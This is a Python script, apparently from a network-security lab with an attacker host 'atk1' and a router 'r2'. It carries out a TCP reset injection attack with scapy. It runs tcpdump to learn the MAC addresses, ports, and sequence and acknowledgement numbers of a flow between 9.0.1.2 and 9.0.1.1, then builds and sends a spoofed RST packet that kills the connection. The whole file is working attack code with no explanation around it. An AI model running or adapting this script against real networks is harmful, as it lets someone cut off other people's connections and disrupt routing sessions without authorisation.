#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes

from subprocess import Popen, PIPE
from scapy.all import *


SOURCE_ADDRESS = '9.0.1.2'
DESTINATION_ADDRESS = '9.0.1.1'


def log(s, col="green"):
	print T.colored(s, col)


def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	tcp = TCP(flags="RA")
	tcp.sport=int(srcPort)
	tcp.dport=int(dstPort)
	tcp.seq=int(seqNum)
	tcp.ack=int(ackNum)

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface='atk1-eth0')


def extract_address_port(value):
	values = value.split('.')

	address = values[0] + '.' + values[1] + '.' + values[2] + '.' + values[3]

	port = values[4]

	return address, port


def extract_ports_and_numbers(row):
	srcPort, dstPort, seqNum, ackNum = None, None, None, None

	values = row.split(' ')

	a = values[2].split('.')
	srcAddr = '.'.join(a[0:4])

	b = values[4].replace(':', '').split('.')
	dstAddr = '.'.join(b[0:4])

	if srcAddr == SOURCE_ADDRESS and dstAddr == DESTINATION_ADDRESS and values[7] == 'seq':
		srcPort = a[4]
		dstPort = b[4]

		values[8] = values[8].replace(',', '')

		if ':' in values[8]:
			seqNum = values[8].split(':')[1]
		else:
			seqNum = values[8]

		ackNum = values[10].replace(',', '')

	return srcPort, dstPort, seqNum, ackNum


def retrieve_atk1_mac_address(iface):
	p = Popen(('ifconfig'), stdout=PIPE)

	for row in iter(p.stdout.readline, b''):
		if iface in row:
			values = row.split(' ')

			p.kill()

			return values[5]

	p.kill()

	return None


def extract_r2_mac_addresses(row, ip_address):
	values = row.split(' ')

	if ip_address in values[9]:
		return values[1].replace(',','')

	if ip_address in values[11]:
		return values[3].replace(',','')

	return None


def retrieve_r2_mac_address(iface, ip_address):
	print 'retrieving r2 mac addres'

	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)

	r2_mac_address = None

	for row in iter(p.stdout.readline, b''):
		r2_mac_address = extract_r2_mac_addresses(row, ip_address)

		print r2_mac_address

		if r2_mac_address != None:
			p.kill()

			break

	return r2_mac_address


def retrieve_ports_and_numbers():
	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)

	srcPort, dstPort, seqNum, ackNum = None, None, None, None

	for row in iter(p.stdout.readline, b''):
		srcPort, dstPort, seqNum, ackNum = extract_ports_and_numbers(row)

		if srcPort and dstPort and seqNum and ackNum:
			p.kill()

			return srcPort, dstPort, seqNum, ackNum

		srcPort, dstPort, seqNum, ackNum = None, None, None, None


def main():
	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
	assert src_mac_address is not None
	print 'source MAC address', src_mac_address

	dst_mac_address = retrieve_r2_mac_address('atk1-eth1', '9.0.1.1')
	assert dst_mac_address is not None
	print 'destination MAC address', dst_mac_address

	srcPort, dstPort, seqNum, ackNum = retrieve_ports_and_numbers()
	assert srcPort is not None
	assert dstPort is not None
	assert seqNum is not None
	assert ackNum is not None
	print 'source port', srcPort
	print 'destination port', dstPort
	print 'sequence number', seqNum
	print 'acknowledge number', ackNum

	send_rst_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum)


if __name__ == "__main__":
	main()